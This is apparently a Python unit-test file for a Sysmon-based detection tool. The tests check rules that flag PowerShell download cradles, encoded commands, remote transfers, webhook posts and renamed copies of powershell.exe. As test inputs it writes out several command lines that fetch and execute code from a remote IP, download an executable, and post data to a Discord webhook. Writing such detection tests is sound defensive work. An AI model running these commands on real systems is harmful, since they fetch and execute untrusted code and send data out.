"""PowerShell cradles and renamed system utilities on the Sysmon event stream.

2026-10-27 coverage audit: download cradles and encoded commands were caught
only by the 2-minute process snapshot or an unusual parent, and every rule
matched on the image name, so a renamed copy of a system tool slipped past all
of them. These run the real detection through the audit's replay path.
"""
import unittest
from unittest import mock

from jarvis.collectors.telemetry import sysmon, techniques

PS = techniques._PS
CRADLE = "update.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')\""


def row(image, cmdline, original="", parent=r"C:\Windows\explorer.exe", rid=1):
    return {"id": 1, "record_id": rid, "seq": rid, "process_guid": f"{{g{rid}}}",
            "parent_guid": "{p}", "process_id": str(100 + rid), "parent_cmdline": "",
            "time": "2026-10-27 15:00:00.000", "image": image, "target": "", "granted": "",
            "parent": parent, "hashes": "", "query": "", "loaded": "", "signed": "",
            "sigstat": "", "dest": "", "dport": "", "initiated": None, "dns_status": "",
            "reg_key": "", "reg_details": "", "cmdline": cmdline, "type": "",
            "original_name": original, "start_module": "", "start_function": "",
            "start_address": "", "description": "", "error_id": "", "state": ""}


def replay(*rows):
    with mock.patch.object(sysmon, "status", return_value={}):
        out = sysmon.audit(None, hosts=("win",), events=list(rows))
    return out[0] if isinstance(out, tuple) else out


class RenamedUtilityTests(unittest.TestCase):
    def test_renamed_powershell_is_reported_and_judged_as_powershell(self):
        out = replay(row(r"C:\Users\Public\update.exe", CRADLE, original="PowerShell.EXE"))
        titles = [f["title"] for f in out]
        self.assertIn("a renamed copy of powershell.exe ran", titles)
        self.assertTrue(any("download cradle" in t for t in titles), titles)
        renamed = next(f for f in out if f["title"].startswith("a renamed copy"))
        self.assertEqual(renamed["severity"], "high")
        self.assertEqual(renamed["techniques"], ["T1036"])

    def test_the_real_tool_under_its_own_name_is_not_renamed(self):
        out = replay(row(PS, "powershell -c Get-Date", original="PowerShell.EXE"),
                     row(r"C:\Program Files\PowerShell\7\pwsh.exe", "pwsh -c 1",
                         original="pwsh.dll", rid=2))
        self.assertFalse(any(f["title"].startswith("a renamed copy") for f in out))

    def test_unwatched_programs_may_carry_any_original_name(self):
        out = replay(row(r"C:\Program Files\Code\Code.exe", "Code.exe", original="electron.exe"))
        self.assertFalse(any(f["title"].startswith("a renamed copy") for f in out))


class PowerShellRuleTests(unittest.TestCase):
    def titles(self, cmd, image=PS):
        return [r.title for r, _ in techniques.match(image, cmd, techniques.WIN)]

    def test_cradle_in_either_order_is_one_high_finding(self):
        for cmd in ("powershell -c \"irm https://get.example/x | iex\"",
                    "powershell -c \"$s=(iwr https://203.0.113.9/s).Content; Invoke-Expression $s\"",
                    "powershell -c \"iex (iwr http://203.0.113.9/a)\""):
            got = self.titles(cmd)
            self.assertEqual(got, ["PowerShell downloads and runs code (download cradle)"], cmd)

    def test_argus_own_loopback_calls_are_quiet(self):
        for cmd in (techniques._JARVIS_MODEL[1],
                    "powershell -c \"iwr http://127.0.0.1:8787/api/health\"",
                    "powershell -c \"irm http://localhost:11434/api/tags\""):
            self.assertEqual(self.titles(cmd), [], cmd)

    def test_remote_transfer_without_execution_is_medium(self):
        got = [r for r, _ in techniques.match(
            PS, "powershell -c \"Invoke-WebRequest https://203.0.113.9/p.exe -OutFile p.exe\"",
            techniques.WIN)]
        self.assertEqual([(r.severity, r.title) for r in got],
                         [("medium", "PowerShell transfers data to or from a remote host")])

    def test_encoded_command_variants(self):
        b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
        for flag in ("-e", "-ec", "-enc", "-EncodedCommand", "/enc"):
            self.assertIn("PowerShell ran an encoded command (contents hidden from the command line)",
                          self.titles(f"powershell -NoP {flag} {b64}"), flag)
        for cmd in ("powershell -ExecutionPolicy Bypass -File a.ps1", "powershell -ep bypass -f a.ps1"):
            self.assertEqual(self.titles(cmd), [], cmd)

    def test_webhook_from_powershell_is_now_seen(self):
        self.assertIn("PowerShell talks to a file-drop or chat webhook service", self.titles(
            "powershell -c \"irm https://discord.com/api/webhooks/1/x -Method Post -Body $d\""))


if __name__ == "__main__":
    unittest.main()
